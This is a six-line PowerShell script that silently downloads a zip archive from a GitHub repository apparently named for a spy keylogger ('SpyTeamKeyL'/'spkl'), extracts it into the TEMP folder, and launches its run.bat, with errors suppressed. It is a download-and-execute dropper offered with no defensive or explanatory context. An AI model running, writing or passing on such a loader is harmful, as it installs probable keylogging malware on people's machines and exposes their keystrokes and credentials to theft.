Remove-Item $env:TEMP\spkl -Recurse -Force -ErrorAction SilentlyContinue
Remove-Item $env:TEMP\spkl.zip -Force -ErrorAction SilentlyContinue
Invoke-WebRequest -Uri https://github.com/Galavic/SpyTeamKeyL/raw/refs/heads/main/spkl.zip -OutFile $env:TEMP\spkl.zip
Add-Type -AssemblyName System.IO.Compression.FileSystem
[System.IO.Compression.ZipFile]::ExtractToDirectory("$env:TEMP\spkl.zip","$env:TEMP\spkl")
Start-Process cmd -ArgumentList "/c cd /d $env:TEMP\spkl && run.bat"
